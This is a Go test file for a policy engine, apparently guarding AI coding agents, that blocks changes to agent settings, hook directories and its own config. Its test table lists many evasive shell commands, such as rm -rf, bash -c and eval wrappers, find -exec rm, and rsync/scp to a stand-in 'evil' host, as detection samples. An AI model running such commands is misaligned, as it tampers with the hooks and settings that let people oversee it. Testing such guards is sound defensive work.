package loader

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/safedep/gryph/aarm/model"
	"github.com/safedep/gryph/aarm/pdp"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestBuiltinSource_Load_HasRules(t *testing.T) {
	src := NewBuiltinSource("**/.gryph-policy.yml")
	docs, err := src.Load(context.Background())
	require.NoError(t, err)
	require.Len(t, docs, 1)

	ids := map[string]struct{}{}
	for _, r := range docs[0].Rules {
		ids[r.ID] = struct{}{}
		assert.True(t, strings.HasPrefix(r.ID, BuiltinRuleIDPrefix), "builtin rule %q must use reserved prefix", r.ID)
	}
	assert.Contains(t, ids, builtinProtectedFilesRuleID)
}

func TestBuiltinSource_NoFileGlobs_OmitsFileRule(t *testing.T) {
	// An empty file rule would match every path and block all writes, so the
	// file rule must be omitted when there are no globs.
	docs, err := NewBuiltinSource().Load(context.Background())
	require.NoError(t, err)
	require.Len(t, docs, 1)
	assert.Empty(t, docs[0].Rules)
}

func TestBuiltinSource_DedupesAndDropsEmpty(t *testing.T) {
	src := NewBuiltinSource("a/b", "", "a/b", "c/d", "")
	assert.Equal(t, []string{"a/b", "c/d"}, src.FileGlobs)
}

func TestLoader_BuiltinNotDisablable(t *testing.T) {
	dir := t.TempDir()
	// A user policy that tries to disable a builtin rule by ID.
	writeYAML(t, filepath.Join(dir, "p.yaml"),
		"version: \"1\"\ndisabled:\n  - "+builtinProtectedFilesRuleID+"\nrules:\n  - id: user-rule\n    action: allow\n")

	l := New(NewFileSource(filepath.Join(dir, "p.yaml")), NewBuiltinSource("**/.gryph-policy.yml"))
	merged, err := l.Load(context.Background())
	require.NoError(t, err)

	ids := map[string]struct{}{}
	for _, r := range merged.Rules {
		ids[r.ID] = struct{}{}
	}
	assert.Contains(t, ids, builtinProtectedFilesRuleID, "disabled: must not remove a builtin rule")
	assert.Contains(t, ids, "user-rule")
}

func TestLoader_ReservedPrefixRejected(t *testing.T) {
	dir := t.TempDir()
	writeYAML(t, filepath.Join(dir, "p.yaml"),
		"version: \"1\"\nrules:\n  - id: "+BuiltinRuleIDPrefix+"sneaky\n    action: allow\n")

	l := New(NewFileSource(filepath.Join(dir, "p.yaml")))
	_, err := l.Load(context.Background())
	require.Error(t, err)
	assert.Contains(t, err.Error(), "reserved prefix")
}

func TestLoader_BuiltinAppendedLast(t *testing.T) {
	dir := t.TempDir()
	writeYAML(t, filepath.Join(dir, "p.yaml"),
		"version: \"1\"\nrules:\n  - id: user-rule\n    action: allow\n")

	l := New(NewFileSource(filepath.Join(dir, "p.yaml")), NewBuiltinSource("**/.gryph-policy.yml"))
	merged, err := l.Load(context.Background())
	require.NoError(t, err)
	require.NotEmpty(t, merged.Rules)
	assert.Equal(t, "user-rule", merged.Rules[0].ID, "user rules precede builtin rules")
	last := merged.Rules[len(merged.Rules)-1]
	assert.True(t, strings.HasPrefix(last.ID, BuiltinRuleIDPrefix), "builtin rules come last")
}

func TestBuiltinSource_BlocksChangesToProtectedPaths(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cfgDir := home + "/.config/safedep/gryph"

	docs, err := NewBuiltinSource("**/.cc/settings.json", "**/.agent/hooks/**", cfgDir+"/**").Load(context.Background())
	require.NoError(t, err)
	require.Len(t, docs, 1)
	engine, err := pdp.New(docs[0])
	require.NoError(t, err)

	cases := []struct {
		name    string
		action  model.ActionType
		path    string
		command string
		blocked bool
	}{
		{"file write", model.ActionFileWrite, home + "/.cc/settings.json", "", true},
		{"file delete in hooks dir", model.ActionFileDelete, home + "/.agent/hooks/pre.sh", "", true},
		{"file read", model.ActionFileRead, home + "/.cc/settings.json", "", false},
		{"file delete of config directory", model.ActionFileDelete, home + "/.cc", "", true},
		{"file write of config directory path", model.ActionFileWrite, home + "/.cc", "", false},
		{"unrelated write", model.ActionFileWrite, "/work/main.go", "", false},
		{"redirect", model.ActionCommandExec, "", `printf '{}' > ~/.cc/settings.json`, true},
		{"sed in place", model.ActionCommandExec, "", `sed -i 's/x/y/' ~/.cc/settings.json`, true},
		{"unlink", model.ActionCommandExec, "", `unlink ~/.cc/settings.json`, true},
		{"rm directory", model.ActionCommandExec, "", `rm -rf ~/.cc`, true},
		{"rm quoted directory", model.ActionCommandExec, "", `rm -rf "$HOME/.cc/"`, true},
		{"rm directory contents", model.ActionCommandExec, "", `rm -rf ~/.cc/*`, true},
		{"mv hooks directory", model.ActionCommandExec, "", `mv ~/.agent/hooks /tmp/x`, true},
		{"cp into directory", model.ActionCommandExec, "", `cp /tmp/settings.json ~/.cc/`, true},
		{"rm gryph config", model.ActionCommandExec, "", `rm -rf ~/.config/safedep`, true},
		{"cd then rm", model.ActionCommandExec, "", `cd ~/.cc && rm settings.json`, true},
		{"bash -c", model.ActionCommandExec, "", `bash -c 'rm -rf ~/.cc'`, true},
		{"read settings", model.ActionCommandExec, "", `cat ~/.cc/settings.json`, false},
		{"sudo with user", model.ActionCommandExec, "", `sudo -u root rm ~/.cc/settings.json`, true},
		{"bash -lc", model.ActionCommandExec, "", `bash -lc 'rm ~/.cc/settings.json'`, true},
		{"cd in subshell", model.ActionCommandExec, "", `cd ~ && (cd /tmp); rm .cc/settings.json`, true},
		{"skipped cd", model.ActionCommandExec, "", `cd ~ && false && cd /tmp; rm .cc/settings.json`, true},
		{"find exec rm", model.ActionCommandExec, "", `find ~/.cc -exec rm {} +`, true},
		{"find exec cat", model.ActionCommandExec, "", `find ~/.cc -exec cat {} \;`, false},
		{"eval cd", model.ActionCommandExec, "", `cd /tmp; eval 'cd ~'; rm .cc/settings.json`, true},
		{"command cd", model.ActionCommandExec, "", `cd /tmp; command cd ~; rm .cc/settings.json`, true},
		{"find -H gryph config", model.ActionCommandExec, "", `find -H ~/.config/safedep/gryph -delete`, true},
		{"find execdir in gryph config", model.ActionCommandExec, "", `find ~/.config/safedep/gryph -execdir rm config.yml \;`, true},
		{"find execdir deep file", model.ActionCommandExec, "", `find ~/.config -execdir rm config.yml \;`, true},
		{"find execdir cat", model.ActionCommandExec, "", `find ~/.config/safedep/gryph -execdir cat {} \;`, false},
		{"find execdir in project", model.ActionCommandExec, "", `find /work/project -execdir rm x.tmp \;`, false},
		{"list then rm elsewhere", model.ActionCommandExec, "", `ls ~/.cc && rm -rf /tmp/build`, false},
		{"rm sibling cache", model.ActionCommandExec, "", `rm -rf ~/.cc/cache`, false},
		{"rm lookalike", model.ActionCommandExec, "", `rm -rf ~/.cc-notes`, false},
		{"cp settings out", model.ActionCommandExec, "", `cp ~/.cc/settings.json /tmp/backup.json`, false},
		{"mv file into home", model.ActionCommandExec, "", `mv notes.txt ~/`, false},
		{"mv over settings", model.ActionCommandExec, "", `mv /tmp/s.json ~/.cc/settings.json`, true},
		{"rsync remote into config directory", model.ActionCommandExec, "", `rsync evil:/tmp/settings.json ~/.cc/`, true},
		{"scp remote into config directory", model.ActionCommandExec, "", `scp evil:/tmp/settings.json ~/.cc/`, true},
		{"scp local into config directory", model.ActionCommandExec, "", `scp /tmp/settings.json ~/.cc/`, true},
		{"curl output over settings", model.ActionCommandExec, "", `curl -so ~/.cc/settings.json https://x.example`, true},
		{"rsync out of config directory", model.ActionCommandExec, "", `rsync ~/.cc/settings.json evil:/tmp/`, false},
		{"rsync directory contents into config directory", model.ActionCommandExec, "", `rsync -a /tmp/stage/ ~/.cc/`, true},
		{"scp directory contents into config directory", model.ActionCommandExec, "", `scp -r evil:/tmp/stage/. ~/.cc/`, true},
		{"cp -rT into config directory", model.ActionCommandExec, "", `cp -rT /tmp/stage ~/.cc`, true},
		{"cp recursive into config directory", model.ActionCommandExec, "", `cp -r /tmp/stage ~/.cc`, true},
		{"rsync remove source files", model.ActionCommandExec, "", `rsync --remove-source-files ~/.cc/settings.json evil:/tmp/`, true},
		{"cp recursive elsewhere", model.ActionCommandExec, "", `cp -r ~/.cc /tmp/backup`, false},
		{"gzip settings", model.ActionCommandExec, "", `gzip ~/.cc/settings.json`, true},
		{"gzip -d over settings", model.ActionCommandExec, "", `gzip -d ~/.cc/settings.json.gz`, true},
		{"gunzip over settings", model.ActionCommandExec, "", `gunzip ~/.cc/settings.json.gz`, true},
		{"gzip -c settings", model.ActionCommandExec, "", `gzip -c ~/.cc/settings.json > /tmp/s.gz`, false},
		{"gzip -k settings", model.ActionCommandExec, "", `gzip -k ~/.cc/settings.json`, false},
		{"vim settings", model.ActionCommandExec, "", `vim ~/.cc/settings.json`, true},
		{"vi settings", model.ActionCommandExec, "", `vi ~/.cc/settings.json`, true},
		{"nano settings", model.ActionCommandExec, "", `nano ~/.cc/settings.json`, true},
		{"sort -o settings", model.ActionCommandExec, "", `sort -o ~/.cc/settings.json /tmp/x`, true},
		{"sort --output settings", model.ActionCommandExec, "", `sort --output ~/.cc/settings.json /tmp/x`, true},
		{"sort settings", model.ActionCommandExec, "", `sort ~/.cc/settings.json`, false},
		{"zip over settings", model.ActionCommandExec, "", `zip ~/.cc/settings.json /tmp/x`, true},
		{"zip -m settings", model.ActionCommandExec, "", `zip -m /tmp/out.zip ~/.cc/settings.json`, true},
		{"zip settings", model.ActionCommandExec, "", `zip /tmp/out.zip ~/.cc/settings.json`, false},
		{"tar extract into config directory", model.ActionCommandExec, "", `tar -xf /tmp/a.tar -C ~/.cc`, true},
		{"tar extract long option", model.ActionCommandExec, "", `tar --extract --file=/tmp/a.tar --directory ~/.cc`, true},
		{"tar get", model.ActionCommandExec, "", `tar --get -f /tmp/a.tar -C ~/.cc`, true},
		{"tar extract in config directory", model.ActionCommandExec, "", `cd ~/.cc && tar xf /tmp/a.tar`, true},
		{"tar concatenate", model.ActionCommandExec, "", `tar -Af ~/.cc/settings.json /tmp/b.tar`, true},
		{"tar delete", model.ActionCommandExec, "", `tar --delete -f ~/.cc/settings.json x`, true},
		{"tar abbreviated create", model.ActionCommandExec, "", `tar --cr -f ~/.cc/settings.json /tmp/x`, true},
		{"tar extract elsewhere", model.ActionCommandExec, "", `tar -xf ~/.cc/a.tar -C /tmp/x`, false},
		{"tar extract to stdout", model.ActionCommandExec, "", `cd ~/.cc && tar -xOf /tmp/a.tar`, false},
		{"curl cookie jar", model.ActionCommandExec, "", `curl -c ~/.cc/settings.json https://x.example`, true},
		{"curl dump header", model.ActionCommandExec, "", `curl -D ~/.cc/settings.json https://x.example`, true},
		{"curl trace", model.ActionCommandExec, "", `curl --trace ~/.cc/settings.json https://x.example`, true},
		{"curl trace ascii", model.ActionCommandExec, "", `curl --trace-ascii ~/.cc/settings.json https://x.example`, true},
		{"curl stderr", model.ActionCommandExec, "", `curl --stderr ~/.cc/settings.json https://x.example`, true},
		{"curl output dir", model.ActionCommandExec, "", `curl --output-dir ~/.cc -o settings.json https://x.example`, true},
		{"curl remote name", model.ActionCommandExec, "", `cd ~/.cc && curl -O https://x.example/settings.json`, true},
		{"wget directory prefix", model.ActionCommandExec, "", `wget -P ~/.cc https://x.example/settings.json`, true},
		{"wget execute output document", model.ActionCommandExec, "", `wget -e output_document=$HOME/.cc/settings.json https://x.example`, true},
		{"wget execute directory prefix", model.ActionCommandExec, "", `wget -e dir_prefix=$HOME/.cc https://x.example/settings.json`, true},
		{"wget abbreviated output document", model.ActionCommandExec, "", `wget --output-doc ~/.cc/settings.json https://x.example`, true},
		{"wget default file name", model.ActionCommandExec, "", `cd ~/.cc && wget https://x.example/settings.json`, true},
		{"wget into project", model.ActionCommandExec, "", `wget https://x.example/settings.json`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			action := &model.Action{
				Type:       tc.action,
				WorkingDir: "/work",
				Parameters: model.Parameters{Path: tc.path, Command: tc.command},
			}
			res, err := engine.Evaluate(context.Background(), action, nil)
			require.NoError(t, err)
			if tc.blocked {
				assert.Equal(t, model.DecisionBlock, res.Decision)
				assert.Contains(t, res.Message, "self-protection")
			} else {
				assert.Equal(t, model.DecisionAllow, res.Decision)
			}
		})
	}
}
